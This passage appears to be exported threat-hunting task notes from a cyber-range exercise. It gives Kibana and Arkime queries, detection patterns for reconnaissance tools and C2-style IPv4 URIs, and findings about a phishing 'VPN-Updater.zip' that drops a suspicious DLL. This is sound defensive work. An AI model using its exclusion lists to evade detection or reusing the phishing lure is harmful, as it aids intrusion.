    - `AND NOT process.executable:("C:\\Program Files (x86)\\Simspace" OR "C:\\Windows\\Microsoft.NET\\Framework64" OR "C:\\Windows\\Microsoft.NET\\Framework" OR "C:\\Windows\\system32\\cleanmgr.exe" OR "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" OR "C:\\Windows\\system32\\taskhostw.exe" OR "C:\\windows\\system32\\taskhost.exe" OR "C:\\windows\\System32\\sdiagnhost.exe" OR "C:\\Program Files\\Malwarebytes" OR "C:\\Program Files\\Windows Defender\\MsMpEng.exe" OR "C:\\Windows\\SysWOW64\\OneDriveSetup.exe" OR "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin")`
- Prevent matching when PowerShell or web server processes create randomly-named DLLs, which are often tied to normal software operations or web application functionality
    - `AND NOT (process.executable:("powershell.exe" OR "c:\\windows\\system32\\inetsrv\\w3wp.exe") AND file.name:/[a-z0-9]{8}\.dll/)`
- Exclude specific file paths known to be associated with benign software installations and update processes, further refining the results
    - `AND NOT file.path:("C:\\Program Files\\winlogbeat" OR "C:\\PROGRA~1\\WINLOG~" OR "C:\\Windows\\Microsoft.NET\\Framework64" OR "C:\\Program Files (x86)\\Microsoft Office" OR "C:\\Program Files (x86)\\Common Files\\" OR "C:\\Program Files\\Common Files" OR "C:\\Program Files (x86)\\Microsoft" OR "C:\\Program Files (x86)\\Microsoft SQL Server" OR "C:\\Program Files\\Microsoft Office" OR "C:\\Program Files (x86)\\Microsoft.NET" OR "C:\\Users\\rangetech\\AppData\\Roaming\\Microsoft\\Installer" OR "C:\\Setup\\7z2301-x64.exe")`
- Filter out randomly named DLLs created in the temporary directory, which are frequently benign (can be malicious)
    - `AND NOT (file.directory:"C:\\Windows\\Temp" AND file.name:/[a-z0-9]{8}\.dll/)`
- Prevent matches of files created in the printer directory by the print spooler, as this is normal operation
    - `AND NOT (file.path:"C:\\Windows\\System32\\spool\\drivers" AND process.executable:"C:\\Windows\\System32\\spoolsv.exe")`
- Exclude events where WMI creates temporary files, as this is a common and generally safe system activity
    - `AND NOT (file.path:"C:\\Windows\\Temp" AND process.executable:"C:\\Windows\\system32\\wbem\\wmiprvse.exe")`
- Filter out events where `svchost.exe` creates files in WindowsApps, often related to Microsoft Store applications, thus excluding common false positives
    - `AND NOT (file.path:"AppData\\Local\\Microsoft\\WindowsApps" AND process.executable:"C:\\Windows\\system32\\svchost.exe")`
- Excludes events where common installers (like 7zip or msiexec) create files in program directories, to remove false positives from normal software installation processes
    - `AND NOT (file.path:("C:\\Program Files" OR "C:\\Windows\\SysWOW64") AND process.executable:("C:\\Setup\\7z2301-x64.exe" OR "C:\\Windows\\system32\\msiexec.exe"))`

Potential Hardening Recommendations:
- Deploy policy to prevent execution from user-profile (documents/desktop/etc)  
- Update sysmon config to log DLL imageload events from User-writeable locations

tasks.task_title: HTT04.04 - NET (Castillo) strange inbound connections from external (SMTP & SSH)
tasks.task_description:
### Overview

Reviewing any strange inbound connection from external. I built the query to filter ext traffic to inbound to the dal utilizing port 25 initially. 

### Methodology

Arkime template query used to collect **smtp** data:


`ip.dst==[8.29.168.0/24, 8.29.22.0/24, 207.228.76.0/24, 207.228.7.0/24, 69.162.81.0/24, 8.29.0.0/24, 8.29.52.0/24, 8.29.168.0/24, 8.29.22.0/24, 69.162.81.0/24, 207.228.238.0/24, 207.238.76.0/24, 207.228.7.0/24] && port==25`

add `&& email.fn == EXISTS!` to discover any attachments


Arkime template query used to collect **ssh** data:

`ip.dst==[8.29.168.0/24, 8.29.22.0/24, 207.228.76.0/24, 207.228.7.0/24, 69.162.81.0/24, 8.29.0.0/24, 8.29.52.0/24, 8.29.168.0/24, 8.29.22.0/24, 69.162.81.0/24, 207.228.238.0/24, 207.238.76.0/24, 207.228.7.0/24] && port==22`












(Place any improvements or updated instructions/tips/strategies for completing this task in the future into the OVERVIEW section - above this line BEFORE the Event Collected section. All other changes will be sanitized and lost when this task is re-imported.)

### Event Collected/Used: 

Arkime, Wireshark, Cyberchef

### Query/Actions:

Lucene/Arkime Query:
```
1) ip.dst==[172.16.1.0/24, 172.16.2.0/24, 172.16.90.0/24, 172.16.91.0/24] && port==25
2) ip.dst==[172.16.1.0/24, 172.16.2.0/24, 172.16.90.0/24, 172.16.91.0/24] && port==22
3) ip.dst==[172.16.1.0/24, 172.16.2.0/24, 172.16.90.0/24, 172.16.91.0/24] && port==25 && ip.src != 172.32.2.2 && email.fn == EXISTS!
4) ip.src != $MP_NET && ip.dst == [172.16.1.0/24,172.16.2.0/24,172.16.90.0/24,172.16.91.0/24] && port == 22 && ip.src != 172.16.0.18 && ip.dst != 172.16.2.4
```

[List of files sent](https://arkime.lan/api/unique?exp=email.fn&counts=1&stopTime=1712447999&startTime=1712102400&expression=ip.dst%3D%3D%5B172.16.1.0%2F24%2C%20172.16.2.0%2F24%2C%20172.16.90.0%2F24%2C%20172.16.91.0%2F24%5D%20%26%26%20port%3D%3D25%20%26%26%20ip.src%20%21%3D%20172.32.2.2)

Found files:
scary\_payload\_2.txt, scary\_payload\_1.txt, VPN-Updater.zip

[List to 1 result of VPN-Updater.zip](https://arkime.lan/sessions?expression=ip.dst%3D%3D%5B172.16.1.0%2F24,%20172.16.2.0%2F24,%20172.16.90.0%2F24,%20172.16.91.0%2F24%5D%20%26%26%20port%3D%3D25%20%26%26%20ip.src%20%21%3D%20172.32.2.2%20%26%26%20email.fn%20%3D%3D%20VPN-Updater.zip&stopTime=1712447999&startTime=1712102400&length=1000)

"Attached is the VPN Updater in order to connect to the network for Rangers. Please run the file as administrator to avoid installation issues."

**SSH**:

[Arkime results of external SSH traffic](https://arkime.lan/sessions?expression=ip.src%20%21%3D%20%24MP_NET%20%26%26%20ip.dst%20%3D%3D%20%5B172.16.1.0%2F24,172.16.2.0%2F24,172.16.90.0%2F24,172.16.91.0%2F24%5D%20%26%26%20port%20%3D%3D%2022%20%26%26%20ip.src%20%21%3D%20172.16.0.18%20%26%26%20ip.dst%20%21%3D%20172.16.2.4&stopTime=1712447999&startTime=1712102400&length=1000)

### Justification:

High amount of traffic from an external IP from Brazil to IPs in the server subnet

tasks.task_title: HTT13.07 - HOST (Dolifka) Hunt for ingress tool/malware transfer using file write for exe or dll (event ID 11)
tasks.task_description:
### Overview



### Methodology

**Kibana query (Lucene)**
- ```host.ip: (<DAL IP Address Ranges>) AND event.code: 11 AND file.extension: (dll OR exe) AND NOT file.name:  (/[a-z0-9]{8}\.dll/ OR winlogbeat\.exe) AND NOT process.name: ("MsMpEng.exe" OR "MpCmdRun.exe") AND NOT process.executable.keyword: (/C:\\Windows\\Microsoft\.NET\\Framework64\\.+\\csc\.exe/ OR /C:\\Windows\\Microsoft\.NET\\Framework64\\.+\\mscorsvw\.exe/)```

**Explanation**

- Filter to only show hosts on DAL
    - `host.ip: (<DAL IP Address Ranges>)``
- Filter for "File Creation" event
    - `event.code: 11`
- Filter for file extensions of "dll" or "exe"
    - `AND file.extension: (dll OR exe)`
- Filter out Puppet Infrastructure Automation software and Winlogbeat
    - `AND NOT file.name:  (/[a-z0-9]{8}\.dll/ OR winlogbeat\.exe)`
- Filter out Windows Defender
    - `AND NOT process.name: ("MsMpEng.exe" OR "MpCmdRun.exe")`
- Filter out .NET software and Simspace software
    - `AND NOT process.executable.keyword: (/C:\\Windows\\Microsoft\.NET\\Framework64\\.+\\csc\.exe/ OR /C:\\Windows\\Microsoft\.NET\\Framework64\\.+\\mscorsvw\.exe/ OR /"C:\Program Files (x86)\Simspace\UE\x64-jre\bin\java.exe"/)`

Additional filters can be added if necessary, but these remove the vast majority of benign results. 


Potential Hardening Recommendations:
- 












(Place any improvements or updated instructions/tips/strategies for completing this task in the future into the OVERVIEW section - above this line BEFORE the Event Collected section. All other changes will be sanitized and lost when this task is re-imported.)

### Event Collected/Used: 

Winlogbeat Sysmon logs for file creation events.

### Query/Actions:

Lucene/Arkime Query:

- General query for suspicious activity overall
    - `host.ip:("172.16.0.1" OR "172.16.0.5" OR "172.16.1.0/24" OR "172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24") AND NOT _index: "winlogbeat-2024.04.03-000002" AND event.code: 11 AND file.extension: (dll OR exe) AND NOT file.name:  (/[a-z0-9]{8}\.dll/ OR winlogbeat\.exe) AND NOT process.name: ("MsMpEng.exe" OR "MpCmdRun.exe") AND NOT process.executable: (*cleanmgr* OR *Endgame* OR *Malwarebytes* OR *Simspace* OR *w3wp* OR *taskhostw* OR *Microsoft.NET* OR *OneDriveSetup* OR *spoolsv* OR *svchost*) AND NOT file.path: *Endgame* AND NOT file.name: "esensor-install.exe"`

- Suspicious Firefox helper.exe creating DLLs "System.dll", "CityHash.dll", and "ShellLink.dll"
    - `host.ip:("172.16.0.1" OR "172.16.0.5" OR "172.16.1.0/24" OR "172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24") AND NOT _index: "winlogbeat-2024.04.03-000002" AND event.code: 11 AND file.extension: (dll OR exe) AND NOT file.name:  (/[a-z0-9]{8}\.dll/ OR winlogbeat\.exe) AND NOT process.name: ("MsMpEng.exe" OR "MpCmdRun.exe") AND NOT process.executable: (*cleanmgr* OR *Endgame* OR *Malwarebytes* OR *Simspace* OR *w3wp* OR *taskhostw* OR *Microsoft.NET* OR *OneDriveSetup* OR *spoolsv* OR *svchost*) AND NOT file.path: *Endgame* AND NOT file.name: "esensor-install.exe" AND process.name:helper.exe`

- Suspicious "init.exe" file created
    - `host.ip:("172.16.0.1" OR "172.16.0.5" OR "172.16.1.0/24" OR "172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24") AND NOT _index: "winlogbeat-2024.04.03-000002" AND event.code: 11 AND file.extension: (dll OR exe) AND NOT file.name:  (/[a-z0-9]{8}\.dll/ OR winlogbeat\.exe) AND NOT process.name: ("MsMpEng.exe" OR "MpCmdRun.exe") AND NOT process.executable: (*cleanmgr* OR *Endgame* OR *Malwarebytes* OR *Simspace* OR *w3wp* OR *taskhostw* OR *Microsoft.NET* OR *OneDriveSetup* OR *spoolsv* OR *svchost*) AND NOT file.path: *Endgame* AND NOT file.name: "esensor-install.exe" AND file.name: "init.exe"`

- Suspicious file "dbghelp.dll" created
    - `host.ip:("172.16.0.1" OR "172.16.0.5" OR "172.16.1.0/24" OR "172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24") AND NOT _index: "winlogbeat-2024.04.03-000002" AND event.code: 11 AND file.extension: (dll OR exe) AND NOT file.name:  (/[a-z0-9]{8}\.dll/ OR winlogbeat\.exe) AND NOT process.name: ("MsMpEng.exe" OR "MpCmdRun.exe") AND NOT process.executable: (*cleanmgr* OR *Endgame* OR *Malwarebytes* OR *Simspace* OR *w3wp* OR *taskhostw* OR *Microsoft.NET* OR *OneDriveSetup* OR *spoolsv* OR *svchost*) AND NOT file.path: *Endgame* AND NOT file.name: "esensor-install.exe" AND file.name: "dbghelp.dll"`

### Result Link:

- [General query for suspicious activity overall](https://kibana.lan/goto/515d5a60-72cd-11f0-9e5a-85ef666a4f46)
- [Suspicious Firefox uninstaller creating DLLs](https://kibana.lan/goto/741e4b90-72cd-11f0-9e5a-85ef666a4f46)
- [Suspicious "init.exe" file created](https://kibana.lan/goto/8f5f6060-72cd-11f0-9e5a-85ef666a4f46)
- [Suspicious file "dbghelp.dll" created](https://kibana.lan/goto/ac962ab0-72cd-11f0-9e5a-85ef666a4f46)
- [Suspicious file "Install.exe" created](https://kibana.lan/goto/c37871e0-72d0-11f0-9e5a-85ef666a4f46)

### Disposition:

(select one)
- [ ] NONE - No results found using this query for this technique
- [ ] BENIGN - All of the resulting records are normal/benign activity
- [x] SUSPICIOUS - Some/all of the resulting records are not normal/ubiquitous and require further investigation
- [ ] MALICIOUS - Some/all of the resulting records are clearly malicious in nature and this host should be considered compromised
- [ ] N/A - Disposition does not apply to Characterization Tasks  SUSPICIOUS

### Justification:

- DLLs created by Firefox uninstaller are not a normal part of the uninstall process.
- "init.exe" came from `C:\Users\KERI~1.KLI\AppData\Local\Temp\Temp1_VPN-Updater.zip\init.exe` and "Temp1_VPN-Updater.zip" is unusual. It was created on "keri.kline"'s Desktop and creates "dbghelp.dll" in `C:\Program Files\Mozilla Firefox\dbghelp.dll`, an unusual location.
- "VPN-Updater.zip" is an unknown ZIP file that could contain potential malware.
- "dbghelp.dll" is not a normal file for Firefox and is usually located in `C:\Windows\System32`, not `C:\Program Files\Mozilla Firefox`

### Enable hardening recommendation:

- Capture suspicious files, then delete from the system.
- User training on not opening unknown ZIP files.
- Use application whitelisting to prevent unknown programs from executing.

### Methodology

```
event.module:sysmon AND event.code:1 AND process.executable:(netstat.exe OR ipconfig.exe OR arp.exe OR whoami.exe OR net.exe OR "net1.exe" OR netsh.exe OR tasklist.exe OR gpresult.exe OR wmic.exe OR route.exe OR nltest.exe OR nbtstat.exe)  To minimize noise you can optionally include an additional constraint of "AND related.user:SYSTEM"

tasks.task_title: HTT12.03 - NET (TBD) Hunt for http requests made via IPv4 address instead of domain name
tasks.task_description:
### Overview

This task will search for http(s) requests made via an IPv4 address (ie: 172.16.21.2/ybin) instead of a domain name (www.badsite.com/ybin.) Ideally, users in a normal environment would not use IPv4 http(s) requests unless specific mission resources require it (ie: accessing a printer mgmt interface.) This could detect C2 traffic if the adversary is relying on IPv4 addresses instead of DNS.

### Methodology

In Arkime, this search query will look for any uri's that begin with an IPv4 address:
```http.uri == /((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}.*/```


Potential Hardening Recommendations:
